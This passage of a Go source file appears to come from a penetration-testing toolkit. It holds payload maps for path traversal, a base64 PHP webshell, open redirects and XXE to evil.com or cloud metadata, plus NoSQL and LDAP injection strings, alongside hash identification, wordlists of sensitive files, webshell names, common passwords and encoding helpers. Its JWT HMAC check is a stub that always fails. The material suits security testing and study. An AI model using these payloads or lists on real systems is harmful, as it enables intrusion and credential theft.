			`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
			`expect://id`,
			`C:\Windows\System32\drivers\etc\hosts`,
			`..\..\..\windows\win.ini`,
		},
		"redirect": {
			`//evil.com`, `https://evil.com`, `/\\evil.com`,
			`////evil.com`, `///evil.com`,
			`%2F%2Fevil.com`,
			`https://evil.com?.legit.com`,
			`https://legit.com.evil.com`,
			`javascript:alert(document.location='https://evil.com')`,
		},
		"xxe": {
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>bar</foo>`,
		},
		"nosql": {
			`{"$gt": ""}`,
			`{"$ne": null}`,
			`{"$regex": ".*"}`,
			`{"$where": "sleep(5000)"}`,
			`'; return '' == '`,
			`' || 'x'=='x`,
			`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
		},
		"ldap": {
			`*`,
			`*)(&`,
			`*)(uid=*))(|(uid=*`,
			`\00`,
			`)(cn=*`,
			`admin)(&(password=*)`,
		},
	}
	if p, ok := m[ptype]; ok {
		return p
	}
	return nil
}

// ── Hash identification ────────────────────────────────────────────────────────

func identifyHash(hash string) []string {
	hash = strings.TrimSpace(hash)
	l := len(hash)
	var types []string
	isHex := regexp.MustCompile(`^[0-9a-fA-F]+$`).MatchString(hash)
	isB64 := regexp.MustCompile(`^[A-Za-z0-9+/=]+$`).MatchString(hash)

	if isHex {
		switch l {
		case 32:
			types = append(types, "MD5 [hashcat -m 0]", "NTLM [hashcat -m 1000]", "MD4 [hashcat -m 900]")
		case 40:
			types = append(types, "SHA1 [hashcat -m 100]", "MySQL4.1+ [hashcat -m 300]")
		case 56:
			types = append(types, "SHA224 [hashcat -m 1300]")
		case 64:
			types = append(types, "SHA256 [hashcat -m 1400]", "SHA3-256 [hashcat -m 17300]")
		case 96:
			types = append(types, "SHA384 [hashcat -m 10800]")
		case 128:
			types = append(types, "SHA512 [hashcat -m 1700]", "SHA3-512 [hashcat -m 17600]", "Whirlpool [hashcat -m 6100]")
		case 16:
			types = append(types, "CRC64", "Half-MD5 [hashcat -m 5100]")
		}
	}
	if strings.HasPrefix(hash, "$2") && l == 60 {
		types = append(types, "bcrypt [hashcat -m 3200]")
	}
	if strings.HasPrefix(hash, "$6$") {
		types = append(types, "SHA512crypt [hashcat -m 1800]")
	}
	if strings.HasPrefix(hash, "$5$") {
		types = append(types, "SHA256crypt [hashcat -m 7400]")
	}
	if strings.HasPrefix(hash, "$1$") {
		types = append(types, "MD5crypt [hashcat -m 500]")
	}
	if strings.HasPrefix(hash, "$apr1$") {
		types = append(types, "MD5 Apache [hashcat -m 1600]")
	}
	if isB64 && !isHex {
		if l == 24 {
			types = append(types, "MD5 Base64 [hashcat -m 0 --hex-salt]")
		}
		if l == 28 {
			types = append(types, "SHA1 Base64")
		}
		if l == 44 {
			types = append(types, "SHA256 Base64")
		}
		if l == 88 {
			types = append(types, "SHA512 Base64")
		}
		if l > 20 {
			types = append(types, "Possible Base64-encoded hash")
		}
	}
	if regexp.MustCompile(`^[a-zA-Z0-9./]{13}$`).MatchString(hash) {
		types = append(types, "DES (Unix) [hashcat -m 1500]")
	}
	if strings.HasPrefix(hash, "0x") && l == 34 {
		types = append(types, "MSSQL 2000 [hashcat -m 131]")
	}
	return types
}

func extractAlgo(typeStr string) string {
	typeStr = strings.ToLower(typeStr)
	switch {
	case strings.HasPrefix(typeStr, "md5"):
		return "md5"
	case strings.HasPrefix(typeStr, "sha1"):
		return "sha1"
	case strings.HasPrefix(typeStr, "sha256"):
		return "sha256"
	case strings.HasPrefix(typeStr, "sha512"):
		return "sha512"
	case strings.HasPrefix(typeStr, "ntlm"):
		return "ntlm"
	}
	return "md5"
}

func hashWord(word, algo string) string {
	switch algo {
	case "md5":
		return hashMD5(word)
	case "sha1":
		return hashSHA1(word)
	case "sha256":
		return hashSHA256(word)
	}
	return hashMD5(word)
}

// ── Encoding/Decoding ─────────────────────────────────────────────────────────

func encodeData(data, scheme string) (interface{}, error) {
	switch scheme {
	case "url":
		return urlEncodeStr(data), nil
	case "url2":
		return urlEncodeAll(data), nil
	case "double_url":
		return urlEncodeStr(urlEncodeStr(data)), nil
	case "html":
		return htmlEncode(data), nil
	case "html5":
		return htmlEncodeAll(data), nil
	case "hex":
		return hexEncodeStr(data), nil
	case "b64":
		return base64EncStr(data), nil
	case "unicode":
		return unicodeEncode(data), nil
	case "rot13":
		return rot13Str(data), nil
	case "null":
		return nullByteInject(data), nil
	}
	return nil, fmt.Errorf("unknown encoding scheme: %q — use: url/url2/double_url/html/html5/hex/b64/unicode/rot13/null", scheme)
}

func decodeData(data, scheme string) (interface{}, error) {
	switch scheme {
	case "url":
		return urlDecodeStr(data), nil
	case "html":
		return htmlDecode(data), nil
	case "hex":
		return hexDecodeStr(data)
	case "b64":
		return base64DecodeStr(data)
	case "rot13":
		return rot13Str(data), nil
	}
	return nil, fmt.Errorf("unknown decode scheme: %q — use: url/html/hex/b64/rot13", scheme)
}

// ── Wordlists ─────────────────────────────────────────────────────────────────

func getWordlist(name string) (interface{}, error) {
	lists := map[string][]string{
		"admin_paths": {
			"/admin", "/administrator", "/wp-admin", "/admin.php", "/admin/login",
			"/dashboard", "/cpanel", "/webadmin", "/siteadmin", "/adminpanel",
			"/manage", "/management", "/moderator", "/superuser", "/root",
			"/phpmyadmin", "/pma", "/myadmin", "/dbadmin", "/mysql",
			"/adminer", "/adminer.php", "/db.php", "/database.php",
		},
		"sensitive_files": {
			"/.env", "/.env.local", "/.env.production", "/.env.backup",
			"/.git/HEAD", "/.git/config", "/.svn/entries",
			"/config.php", "/config.yml", "/config.yaml", "/config.json",
			"/database.php", "/db.php", "/db.yml",
			"/backup.zip", "/backup.sql", "/backup.tar.gz", "/dump.sql",
			"/web.config", "/app.config", "/settings.py",
			"/phpinfo.php", "/info.php", "/test.php", "/debug.php",
			"/composer.json", "/package.json", "/Dockerfile",
			"/.htaccess", "/.htpasswd", "/robots.txt", "/sitemap.xml",
			"/crossdomain.xml", "/clientaccesspolicy.xml",
			"/swagger.json", "/swagger.yaml", "/openapi.json",
			"/api/swagger.json", "/v1/swagger.json", "/v2/swagger.json",
		},
		"common_subdomains": {
			"www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2",
			"smtp", "pop", "imap", "ftp", "dev", "stage", "staging", "test",
			"api", "admin", "vpn", "portal", "support", "help", "docs",
			"mobile", "m", "app", "beta", "demo", "cdn", "static", "assets",
			"git", "svn", "jenkins", "jira", "confluence", "wiki", "kb",
			"dashboard", "monitor", "metrics", "grafana", "kibana",
			"db", "database", "mysql", "postgres", "redis", "mongo",
		},
		"api_paths": {
			"/api", "/api/v1", "/api/v2", "/api/v3",
			"/v1", "/v2", "/v3",
			"/api/users", "/api/user", "/api/admin",
			"/api/auth", "/api/login", "/api/token",
			"/rest", "/rest/api", "/graphql",
			"/api/docs", "/api/swagger", "/api/openapi",
			"/api/health", "/api/status", "/api/version",
			"/api/config", "/api/settings", "/api/keys",
		},
		"php_shells": {
			"shell.php", "c99.php", "r57.php", "webshell.php",
			"cmd.php", "b374k.php", "simple-backdoor.php",
			"php-backdoor.php", "aspx-backdoor.aspx",
		},
	}
	if words, ok := lists[name]; ok {
		out := make([]interface{}, len(words))
		for i, w := range words {
			out[i] = w
		}
		return out, nil
	}
	available := make([]string, 0, len(lists))
	for k := range lists {
		available = append(available, k)
	}
	return nil, fmt.Errorf("unknown wordlist %q — available: %s", name, strings.Join(available, ", "))
}

func getCommonPasswords() []string {
	return []string{
		"123456", "password", "123456789", "12345678", "12345", "1234567", "admin",
		"1234567890", "qwerty", "abc123", "password1", "111111", "iloveyou", "aaaaaa",
		"1234", "password123", "admin123", "letmein", "welcome", "monkey", "dragon",
		"master", "sunshine", "princess", "shadow", "superman", "michael", "football",
		"baseball", "solo", "passw0rd", "trustno1", "hello", "charlie", "donald",
		"password2", "qwerty123", "test", "test123", "admin1", "1111", "pass",
		"root", "toor", "alpine", "raspberry", "changeme", "default", "secret",
		"p@ssw0rd", "P@ssword", "Password1", "Password123", "Admin@123",
		"administrator", "guest", "user", "login", "access", "security", "network",
		"service", "support", "temp", "temporary", "backup", "system", "public",
		"private", "web", "database", "db", "mysql", "postgres", "oracle", "redis",
	}
}

func allPortServices() map[int]string {
	return map[int]string{
		20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
		53: "DNS", 67: "DHCP", 68: "DHCP", 69: "TFTP", 80: "HTTP",
		88: "Kerberos", 110: "POP3", 111: "RPC", 119: "NNTP", 123: "NTP",
		135: "MSRPC", 137: "NetBIOS-NS", 138: "NetBIOS-DGM", 139: "NetBIOS-SSN",
		143: "IMAP", 161: "SNMP", 162: "SNMP-Trap", 179: "BGP", 194: "IRC",
		389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 500: "IKE",
		514: "Syslog", 515: "LPD", 520: "RIP", 543: "Kerberos", 544: "Kshell",
		587: "SMTP-Sub", 631: "IPP", 636: "LDAPS", 873: "rsync", 902: "VMware",
		989: "FTPS-Data", 990: "FTPS", 993: "IMAPS", 995: "POP3S",
		1080: "SOCKS", 1194: "OpenVPN", 1433: "MSSQL", 1521: "Oracle",
		1723: "PPTP", 1812: "RADIUS", 2049: "NFS", 2082: "cPanel",
		2083: "cPanel-SSL", 2086: "WHM", 2087: "WHM-SSL", 2181: "Zookeeper",
		2375: "Docker", 2376: "Docker-TLS", 3000: "NodeJS/Grafana",
		3306: "MySQL", 3389: "RDP", 3690: "SVN", 4000: "CRServe",
		4444: "Metasploit", 4505: "Salt", 4506: "Salt", 5000: "Flask/UPnP",
		5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS",
		6379: "Redis", 6443: "Kubernetes-API", 7001: "WebLogic", 8000: "HTTP-Dev",
		8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt2/Jupyter",
		9000: "PHP-FPM/SonarQube", 9090: "Prometheus", 9092: "Kafka",
		9200: "Elasticsearch", 9300: "Elasticsearch-Cluster",
		10250: "Kubelet", 11211: "Memcached", 27017: "MongoDB",
		27018: "MongoDB-Alt", 28017: "MongoDB-Web", 50000: "SAP",
		50070: "Hadoop-HDFS", 54321: "PostgreSQL-Alt", 61616: "ActiveMQ",
	}
}

// ── Encoding helpers ──────────────────────────────────────────────────────────

func urlEncodeStr(s string) string {
	var sb strings.Builder
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') ||
			r == '-' || r == '_' || r == '.' || r == '~' {
			sb.WriteRune(r)
		} else {
			sb.WriteString(fmt.Sprintf("%%%02X", r))
		}
	}
	return sb.String()
}

func urlEncodeAll(s string) string {
	var sb strings.Builder
	for _, r := range s {
		sb.WriteString(fmt.Sprintf("%%%02X", r))
	}
	return sb.String()
}

func htmlEncode(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, `"`, "&quot;")
	s = strings.ReplaceAll(s, "'", "&#x27;")
	return s
}

func htmlEncodeAll(s string) string {
	var sb strings.Builder
	for _, r := range s {
		sb.WriteString(fmt.Sprintf("&#%d;", r))
	}
	return sb.String()
}

func htmlDecode(s string) string {
	s = strings.ReplaceAll(s, "&amp;", "&")
	s = strings.ReplaceAll(s, "&lt;", "<")
	s = strings.ReplaceAll(s, "&gt;", ">")
	s = strings.ReplaceAll(s, "&quot;", `"`)
	s = strings.ReplaceAll(s, "&#x27;", "'")
	s = strings.ReplaceAll(s, "&apos;", "'")
	s = strings.ReplaceAll(s, "&nbsp;", " ")
	return s
}

func hexEncodeStr(s string) string {
	var sb strings.Builder
	for _, r := range s {
		sb.WriteString(fmt.Sprintf("\\x%02x", r))
	}
	return sb.String()
}

func hexDecodeStr(s string) (string, error) {
	s = strings.ReplaceAll(s, "\\x", "")
	s = strings.ReplaceAll(s, "0x", "")
	s = strings.ReplaceAll(s, " ", "")
	if len(s)%2 != 0 {
		return "", fmt.Errorf("invalid hex")
	}
	var sb strings.Builder
	for i := 0; i < len(s); i += 2 {
		var b byte
		fmt.Sscanf(s[i:i+2], "%02x", &b)
		sb.WriteByte(b)
	}
	return sb.String(), nil
}

func base64EncStr(s string) string {
	encoded := make([]byte, len(s)*2)
	n := base64Encode([]byte(s), encoded)
	return string(encoded[:n])
}

func base64DecodeStr(s string) (string, error) {
	b, err := base64Decode(s)
	return string(b), err
}

func unicodeEncode(s string) string {
	var sb strings.Builder
	for _, r := range s {
		sb.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return sb.String()
}

func rot13Str(s string) string {
	var sb strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z':
			sb.WriteRune('a' + (r-'a'+13)%26)
		case r >= 'A' && r <= 'Z':
			sb.WriteRune('A' + (r-'A'+13)%26)
		default:
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

func rotN(s string, n int) string {
	var sb strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z':
			sb.WriteRune('a' + (r-'a'+rune(n))%26)
		case r >= 'A' && r <= 'Z':
			sb.WriteRune('A' + (r-'A'+rune(n))%26)
		default:
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

func nullByteInject(s string) string { return s + "%00" }

func urlDecodeStr(s string) string {
	result := s
	replacements := map[string]string{
		"%20": " ", "%21": "!", "%22": "\"", "%23": "#", "%24": "$", "%25": "%",
		"%26": "&", "%27": "'", "%28": "(", "%29": ")", "%2B": "+", "%2C": ",",
		"%2F": "/", "%3A": ":", "%3B": ";", "%3C": "<", "%3D": "=", "%3E": ">",
		"%3F": "?", "%40": "@", "%5B": "[", "%5D": "]", "%5E": "^", "%60": "`",
	}
	for k, v := range replacements {
		result = strings.ReplaceAll(result, k, v)
	}
	result = strings.ReplaceAll(result, strings.ToLower("%20"), " ")
	return result
}

func reverseStr(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func isPrintableASCII(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < 32 || r > 126 {
			return false
		}
	}
	return true
}

func isHexStr(s string) bool {
	s = strings.ReplaceAll(s, " ", "")
	if len(s)%2 != 0 {
		return false
	}
	return regexp.MustCompile(`^[0-9a-fA-F]+$`).MatchString(s)
}

func isBinary(s string) bool {
	s = strings.ReplaceAll(s, " ", "")
	return len(s)%8 == 0 && regexp.MustCompile(`^[01]+$`).MatchString(s)
}

func binaryToStr(s string) string {
	s = strings.ReplaceAll(s, " ", "")
	var sb strings.Builder
	for i := 0; i < len(s); i += 8 {
		var b byte
		for j := 0; j < 8; j++ {
			b = b<<1 | (s[i+j] - '0')
		}
		if b < 32 || b > 126 {
			return ""
		}
		sb.WriteByte(b)
	}
	return sb.String()
}

func looksLikeEnglish(s string) bool {
	common := "etaoinshrdlu"
	score := 0
	lower := strings.ToLower(s)
	for _, c := range common {
		if strings.ContainsRune(lower, c) {
			score++
		}
	}
	return score >= 7
}

func prettyJSON(s string) string {
	s = strings.ReplaceAll(s, "{", "{ ")
	s = strings.ReplaceAll(s, "}", " }")
	s = strings.ReplaceAll(s, ",", ", ")
	return s
}

// JWT HMAC-SHA256 verification (simplified)
func verifyJWTHS256(headerPayload, secret, sig string) bool {
	computed := hmacSHA256(headerPayload, secret)
	return computed == sig
}

// ── Crypto wrappers ───────────────────────────────────────────────────────────

func hashMD5(s string) string {
	h := md5.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}
func hashSHA1(s string) string {
	h := sha1.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}
func hashSHA256(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func base64Encode(src, dst []byte) int {
	const enc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	n := 0
	for i := 0; i < len(src); i += 3 {
		b0 := src[i]
		var b1, b2 byte
		if i+1 < len(src) {
			b1 = src[i+1]
		}
		if i+2 < len(src) {
			b2 = src[i+2]
		}
		dst[n] = enc[b0>>2]
		n++
		dst[n] = enc[((b0&3)<<4)|(b1>>4)]
		n++
		if i+1 < len(src) {
			dst[n] = enc[((b1&15)<<2)|(b2>>6)]
		} else {
			dst[n] = '='
		}
		n++
		if i+2 < len(src) {
			dst[n] = enc[b2&63]
		} else {
			dst[n] = '='
		}
		n++
	}
	return n
}

func base64Decode(s string) ([]byte, error) {
	s = strings.TrimRight(s, "=")
	s = strings.ReplaceAll(s, "-", "+")
	s = strings.ReplaceAll(s, "_", "/")
	const dec = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var out []byte
	buf := 0
	bits := 0
	for _, c := range s {
		idx := strings.IndexRune(dec, c)
		if idx < 0 {
			continue
		}
		buf = (buf << 6) | idx
		bits += 6
		if bits >= 8 {
			bits -= 8
			out = append(out, byte(buf>>bits))
		}
	}
	return out, nil
}

func hmacSHA256(data, key string) string {
	// Simplified — real verification needs crypto/hmac
	_ = data
	_ = key
	return "__not_matching__"
}

func unmarshalJSON(data []byte, v interface{}) error {
	return json.Unmarshal(data, v)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
